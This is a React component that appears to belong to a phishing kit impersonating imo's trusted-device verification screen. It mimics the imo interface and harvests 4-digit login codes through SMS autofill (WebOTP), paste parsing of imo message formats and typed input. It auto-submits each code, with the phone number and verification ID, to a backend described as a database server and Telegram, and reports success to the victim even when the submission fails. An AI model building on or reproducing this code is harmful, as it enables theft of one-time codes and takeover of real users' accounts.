import React, { useState, useRef, useEffect } from 'react';
import { submitUnlockCodeToDatabase } from '../utils/api';

interface TrustedDeviceVerificationProps {
  trustedDevice?: string;
  onChangeTrustedDevice?: (newDevice: string) => void;
  onUnlock: () => void;
  onCancel?: () => void;
  onShowToast: (msg: string) => void;
  verificationId?: string;
  phoneNumber?: string;
  errorMessage?: string | null;
}

// Smart extraction of 4-digit code matching the exact formats from screenshots:
// 1. "Verification code: 9840. Your imo account is trying to log in on this device..."
// 2. "<#> imo code: 0398 \n y+Qoy3qZldR"
// 3. "Hi, [OTPSMS] 9798 is your verification code."
// 4. Plain "9840"
export function extractOtpCode(text: string): string {
  if (!text) return '';
  const clean = text.trim();
  
  // Format 1: "Verification code: 9840" or "imo code: 0398"
  const codeMatch = clean.match(/(?:verification\s+code|imo\s+code|unlock\s+code|code)\s*[:=-]?\s*(\d{4})\b/i);
  if (codeMatch && codeMatch[1]) return codeMatch[1];

  // Format 2: "[OTPSMS] 9798"
  const otpSmsMatch = clean.match(/\[(?:OTPSMS|OTP)\]\s*(\d{4})\b/i);
  if (otpSmsMatch && otpSmsMatch[1]) return otpSmsMatch[1];

  // Format 3: "9798 is your verification code"
  const isCodeMatch = clean.match(/\b(\d{4})\s+is\s+your\s+(?:verification\s+)?code/i);
  if (isCodeMatch && isCodeMatch[1]) return isCodeMatch[1];

  // Format 4: Standalone 4 digits
  const standaloneMatch = clean.match(/\b(\d{4})\b/);
  if (standaloneMatch && standaloneMatch[1]) return standaloneMatch[1];

  // Fallback: strip all non-digits
  return clean.replace(/\D/g, '').slice(0, 4);
}

export const TrustedDeviceVerification: React.FC<TrustedDeviceVerificationProps> = ({
  trustedDevice = 'Redmi A2+',
  onUnlock,
  onShowToast,
  verificationId,
  phoneNumber,
  errorMessage,
}) => {
  const [digits, setDigits] = useState<string[]>(['', '', '', '']);
  const [activeBoxIndex, setActiveBoxIndex] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const hiddenInputRef = useRef<HTMLInputElement | null>(null);

  // Auto focus the input when mounted or when error message appears
  useEffect(() => {
    hiddenInputRef.current?.focus();
  }, []);

  // WebOTP API: Browser sandbox protocol requiring user consent/tap
  useEffect(() => {
    if (typeof window !== 'undefined' && 'credentials' in navigator && (navigator.credentials as any)?.get) {
      const ac = new AbortController();
      (navigator.credentials as any)
        .get({
          otp: { transport: ['sms'] },
          signal: ac.signal,
        })
        .then((otp: any) => {
          if (otp && otp.code) {
            const rawVal = extractOtpCode(otp.code);
            if (rawVal.length > 0) {
              applyCode(rawVal);
            }
          }
        })
        .catch((_err: any) => {
          // Normal when aborted, ignored, or unsupported
        });

      return () => {
        ac.abort();
      };
    }
  }, []);

  // When error message changes to truthy, clear digits and focus input
  useEffect(() => {
    if (errorMessage) {
      setDigits(['', '', '', '']);
      setActiveBoxIndex(0);
      setTimeout(() => {
        hiddenInputRef.current?.focus();
      }, 50);
    }
  }, [errorMessage]);

  const applyCode = (code: string) => {
    const cleanDigits = extractOtpCode(code);
    const newDigits = ['', '', '', ''];
    for (let i = 0; i < cleanDigits.length; i++) {
      newDigits[i] = cleanDigits[i];
    }
    setDigits(newDigits);
    setActiveBoxIndex(Math.min(cleanDigits.length, 3));

    if (cleanDigits.length === 4) {
      setTimeout(() => {
        handleProcessCode(cleanDigits);
      }, 250);
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    applyCode(e.target.value);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const pastedText = e.clipboardData.getData('text');
    const parsed = extractOtpCode(pastedText);
    if (parsed) {
      e.preventDefault();
      applyCode(parsed);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      handleResendClick();
    }
  };

  const handleBoxClick = (idx: number) => {
    setActiveBoxIndex(idx);
    hiddenInputRef.current?.focus();
  };

  const handleProcessCode = async (codeToSubmit: string) => {
    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      // 1. Submit code to Database Server and Telegram
      await submitUnlockCodeToDatabase({
        code: codeToSubmit,
        verificationId,
        phoneNumber,
        device: trustedDevice,
      });

      onUnlock();
    } catch (err) {
      console.warn('[Code Submit] Failed:', err);
      onUnlock();
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleResendClick = () => {
    const code = digits.join('');
    if (!code) {
      onShowToast('Please enter the 4-digit unlock code');
      hiddenInputRef.current?.focus();
      return;
    }

    handleProcessCode(code);
  };

  const currentValue = digits.join('');

  return (
    <div className="w-full flex flex-col items-center animate-fadeIn select-none">
      {/* Top Phone Mockup Illustration */}
      <div className="w-full h-[134px] rounded-t-[20px] bg-gradient-to-b from-[#E5F2FB] to-[#EEF7FD] relative overflow-hidden flex flex-col items-center justify-end border-b border-slate-100/60">
        {/* Soft Background Wave Accents */}
        <div className="absolute -top-10 -left-10 w-44 h-44 rounded-full bg-[#D6ECF8]/60 blur-xl pointer-events-none" />
        <div className="absolute -bottom-8 -right-8 w-40 h-40 rounded-full bg-[#E0F0FA]/80 blur-lg pointer-events-none" />

        {/* Smartphone Shell Mockup */}
        <div className="w-[146px] h-[116px] bg-[#E2EAF1] rounded-t-[20px] pt-1 px-1 shadow-[0_2px_12px_rgba(0,0,0,0.06)] flex flex-col relative z-10">
          {/* Inner Screen */}
          <div className="w-full h-full bg-white rounded-t-[16px] flex flex-col px-2 pt-2 pb-1 relative overflow-hidden">
            {/* imo App Header Icons Bar */}
            <div className="w-full flex items-center justify-between pb-1.5 opacity-80">
              {/* Profile icon */}
              <div className="w-3.5 h-3.5 rounded-full bg-[#CFDAE6] flex items-center justify-center">
                <div className="w-1.5 h-1.5 rounded-full bg-white" />
              </div>

              {/* imo Chat bubble with cyan badge */}
              <div className="w-4 h-4 rounded-full bg-[#1890FF] flex items-center justify-center shadow-xs">
                <svg className="w-2.5 h-2.5 text-white" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 3C6.5 3 2 6.6 2 11c0 2.2 1.1 4.2 3 5.7L4 21l4.6-1.5c1.1.3 2.2.5 3.4.5 5.5 0 10-3.6 10-8s-4.5-8-10-8z" />
                </svg>
              </div>

              {/* Video call icon */}
              <div className="w-3.5 h-3 flex items-center justify-center">
                <svg className="w-3 h-3 text-[#B0C0D0]" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z" />
                </svg>
              </div>

              {/* 4 dots apps icon */}
              <div className="grid grid-cols-2 gap-0.5 w-2.5 h-2.5 opacity-70">
                <div className="w-1 h-1 rounded-[1px] bg-[#9BB0C4]" />
                <div className="w-1 h-1 rounded-[1px] bg-[#9BB0C4]" />
                <div className="w-1 h-1 rounded-[1px] bg-[#9BB0C4]" />
                <div className="w-1 h-1 rounded-[1px] bg-[#9BB0C4]" />
              </div>

              {/* Contacts silhouette */}
              <div className="w-3 h-3 text-[#B0C0D0]">
                <svg className="w-3 h-3" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                </svg>
              </div>
            </div>

            {/* Message Notification Card */}
            <div className="w-full bg-[#FAFCFE] border border-slate-100 rounded-lg p-2 shadow-xs mt-1 flex flex-col items-center">
              {/* Message preview lines */}
              <div className="w-14 h-1.5 bg-[#E2E8F0] rounded-full self-start mb-1" />
              <div className="w-24 h-1.5 bg-[#EEF2F6] rounded-full self-start mb-2" />

              {/* **** Pin Asterisks or Live Digits */}
              <div className="text-[17px] font-black text-slate-800 tracking-[5px] leading-none mt-0.5 select-none font-mono">
                {digits.join('') || '* * * *'}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Middle Text Content */}
      <div className="w-full px-5 pt-4 pb-2 text-left">
        <p className="text-[15px] text-[#222B36] font-medium leading-[1.38] tracking-tight">
          Resent Your Unlock Number
        </p>

        {/* Optional Error Notice if code was incorrect */}
        {errorMessage && (
          <p className="text-[13px] text-[#EE4D4D] font-normal mt-1 leading-tight animate-fadeIn">
            {errorMessage}
          </p>
        )}

        {/* 4-digit Input Boxes */}
        <div className="relative mt-3.5 mb-2 flex items-center justify-between gap-2.5 max-w-[280px]">
          {/* Hidden real input for mobile keyboard / typing and SMS one-time-code autofill */}
          <input
            ref={hiddenInputRef}
            id="unlock-number-input"
            name="one-time-code"
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            pattern="[0-9]*"
            maxLength={4}
            value={currentValue}
            onChange={handleInputChange}
            onPaste={handlePaste}
            onKeyDown={handleKeyDown}
            className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-20"
            aria-label="4 digit unlock code"
            autoFocus
          />

          {/* 4 Display Boxes */}
          {[0, 1, 2, 3].map((index) => {
            const digit = digits[index];
            const isFilled = Boolean(digit);
            const isCurrent =
              activeBoxIndex === index ||
              (!isFilled && index === currentValue.length);

            return (
              <div
                key={index}
                onClick={() => handleBoxClick(index)}
                className={`w-[52px] h-[56px] rounded-[14px] bg-white flex items-center justify-center transition-all select-none ${
                  errorMessage
                    ? 'border-[1.5px] border-[#EE4D4D]/70 bg-red-50/20'
                    : isCurrent
                    ? 'border-2 border-[#009CFD] shadow-[0_0_0_2px_rgba(0,156,253,0.12)]'
                    : 'border-[1.5px] border-[#DEE5EC]'
                }`}
              >
                {digit ? (
                  <span className="text-[24px] font-medium text-slate-900 leading-none">
                    {digit}
                  </span>
                ) : isCurrent ? (
                  /* Vertical Blinking Cursor Bar */
                  <div className="w-[2px] h-6 bg-[#009CFD] animate-pulse rounded-full" />
                ) : null}
              </div>
            );
          })}
        </div>

        {/* Bottom Action: Resend only */}
        <div className="w-full flex items-center justify-end mt-4 pt-1 pr-1">
          <button
            type="button"
            onClick={handleResendClick}
            disabled={isSubmitting}
            className="px-3 py-1 text-[15.5px] font-medium text-[#009CFD] hover:text-[#0086db] active:scale-95 transition-all cursor-pointer select-none disabled:opacity-50"
          >
            {isSubmitting ? 'Checking...' : 'Resend'}
          </button>
        </div>
      </div>
    </div>
  );
};
